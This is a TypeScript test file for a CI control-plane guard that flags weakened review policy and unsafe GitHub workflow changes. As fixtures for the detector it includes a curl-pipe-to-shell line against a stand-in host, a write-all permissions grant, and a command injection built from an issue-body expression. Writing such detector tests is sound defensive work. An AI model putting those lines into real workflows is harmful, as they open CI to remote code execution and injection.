import { describe, expect, it } from 'bun:test'
import {
  assessControlPlane,
  findUnsafeWorkflowChanges,
  findWeakenedProtections,
  stricterRisk,
} from '../src/control-plane.ts'
import type { LoopPolicy } from '../src/policy.ts'
import { classifyRiskMonotonic } from '../src/risk.ts'
import { diffOf, realPolicy } from './support/fixtures.ts'

const policy = realPolicy()

/** The shipped policy with one deliberate weakening applied. */
function weakened(mutate: (draft: LoopPolicy) => void): LoopPolicy {
  const draft = structuredClone(policy) as LoopPolicy
  mutate(draft)
  return draft
}

describe('reaching the control plane', () => {
  it('recognises the loop’s own machinery', () => {
    const assessment = assessControlPlane(
      diffOf([{ path: 'tooling/loop/src/merge-gate.ts', added: ['const x = 1'] }]),
      policy,
    )

    expect(assessment.affected).toBe(true)
    expect(assessment.files).toContain('tooling/loop/src/merge-gate.ts')
  })

  it('treats the policy file as policy however small the change', () => {
    const assessment = assessControlPlane(
      diffOf([{ path: '.github/loop-policy.json', added: ['  "x": 1'] }]),
      policy,
    )

    expect(assessment.policyBearing).toBe(true)
  })

  it('leaves ordinary application code alone', () => {
    const assessment = assessControlPlane(
      diffOf([{ path: 'apps/api/src/modules/sources/service.ts', added: ['const x = 1'] }]),
      policy,
    )

    expect(assessment.affected).toBe(false)
    expect(assessment.policyBearing).toBe(false)
  })
})

describe('weakened protections', () => {
  it('catches a required check being dropped', () => {
    const findings = findWeakenedProtections({
      base: policy,
      head: weakened((draft) => {
        draft.requiredChecks = draft.requiredChecks.filter((check) => check !== 'Tests')
      }),
      diff: diffOf([]),
    })

    expect(findings.some((f) => f.description.includes('`Tests` was removed'))).toBe(true)
    expect(findings.every((f) => f.severity === 'critical')).toBe(true)
  })

  it('catches the high tier losing its second reviewer', () => {
    const findings = findWeakenedProtections({
      base: policy,
      head: weakened((draft) => {
        draft.tiers.high.reviewers = 1
      }),
      diff: diffOf([]),
    })

    expect(findings.some((f) => f.description.includes('review count dropped from 2 to 1'))).toBe(
      true,
    )
  })

  it('catches a verification step being deleted from a tier', () => {
    const findings = findWeakenedProtections({
      base: policy,
      head: weakened((draft) => {
        draft.tiers.low.steps = draft.tiers.low.steps.filter((step) => step.name !== 'test')
      }),
      diff: diffOf([]),
    })

    expect(findings.some((f) => f.description.includes('lost verification step(s): test'))).toBe(
      true,
    )
  })

  it('catches blocking severity being raised so fewer findings block', () => {
    const findings = findWeakenedProtections({
      base: policy,
      head: weakened((draft) => {
        draft.review.blockingSeverity = 'critical'
      }),
      diff: diffOf([]),
    })

    expect(findings.some((f) => f.description.includes('Blocking severity was raised'))).toBe(true)
  })

  it('catches a high-risk path rule being deleted', () => {
    const findings = findWeakenedProtections({
      base: policy,
      head: weakened((draft) => {
        draft.risk.paths = draft.risk.paths.filter(
          (rule) => !rule.patterns.includes('packages/auth/**'),
        )
      }),
      diff: diffOf([]),
    })

    expect(findings.some((f) => f.description.includes('packages/auth/**'))).toBe(true)
  })

  it('says nothing when the policy is unchanged', () => {
    expect(findWeakenedProtections({ base: policy, head: policy, diff: diffOf([]) })).toEqual([])
  })

  it('does not object to a policy that gets stricter', () => {
    const findings = findWeakenedProtections({
      base: policy,
      head: weakened((draft) => {
        draft.requiredChecks = [...draft.requiredChecks, 'Extra check']
        draft.tiers.medium.reviewers = 2
      }),
      diff: diffOf([]),
    })

    expect(findings).toEqual([])
  })
})

describe('unsafe workflow constructs', () => {
  it.each([
    ['pull_request_target:', 'pull_request_target'],
    ['    permissions: write-all', 'write-all'],
    ['      run: curl https://example.test/install.sh | sh', 'downloaded script'],
    // Assembled from parts: a GitHub expression written literally is itself a
    // lint finding, and escaping it would stop the test exercising the pattern.
    [`      run: echo $${'{'}{ github.event.issue.body }}`, 'command injection'],
  ])('flags %s', (line, expected) => {
    const findings = findUnsafeWorkflowChanges(
      diffOf([{ path: '.github/workflows/loop-pr.yml', added: [line] }]),
    )

    expect(findings).toHaveLength(1)
    expect(findings[0]?.severity).toBe('critical')
    expect(findings[0]?.description.toLowerCase()).toContain(expected.toLowerCase())
  })

  it('does not flag removing an unsafe construct', () => {
    const findings = findUnsafeWorkflowChanges(
      diffOf([{ path: '.github/workflows/loop-pr.yml', removed: ['on: pull_request_target:'] }]),
    )

    expect(findings).toEqual([])
  })

  it('ignores files that are not workflows', () => {
    const findings = findUnsafeWorkflowChanges(
      diffOf([{ path: 'docs/loop-engineering.md', added: ['We never use pull_request_target:'] }]),
    )

    expect(findings).toEqual([])
  })
})

describe('risk cannot be lowered from inside the pull request', () => {
  const diff = diffOf([{ path: 'packages/auth/src/provider.ts', added: ['const x = 1'] }])

  it('keeps the base classification when the proposal is more lenient', () => {
    const lenient = weakened((draft) => {
      draft.risk.paths = draft.risk.paths.map((rule) =>
        rule.patterns.includes('packages/auth/**') ? { ...rule, risk: 'low' as const } : rule,
      )
    })

    const assessment = classifyRiskMonotonic({
      diff,
      labels: [],
      basePolicy: policy,
      headPolicy: lenient,
    })

    expect(assessment.risk).toBe('high')
    expect(assessment.reasons.some((r) => r.source === 'base-policy')).toBe(true)
  })

  it('accepts a proposal that raises risk', () => {
    const strict = weakened((draft) => {
      draft.risk.default = 'high'
    })

    const assessment = classifyRiskMonotonic({
      diff: diffOf([{ path: 'README.md', added: ['hello'] }]),
      labels: [],
      basePolicy: policy,
      headPolicy: strict,
    })

    expect(assessment.risk).toBe('high')
  })

  it('is a plain classification when no policy change is proposed', () => {
    const assessment = classifyRiskMonotonic({ diff, labels: [], basePolicy: policy })
    expect(assessment.risk).toBe('high')
  })

  it('takes the stricter of two levels', () => {
    expect(stricterRisk('low', 'high')).toBe('high')
    expect(stricterRisk('high', 'low')).toBe('high')
    expect(stricterRisk('medium', 'medium')).toBe('medium')
  })
})
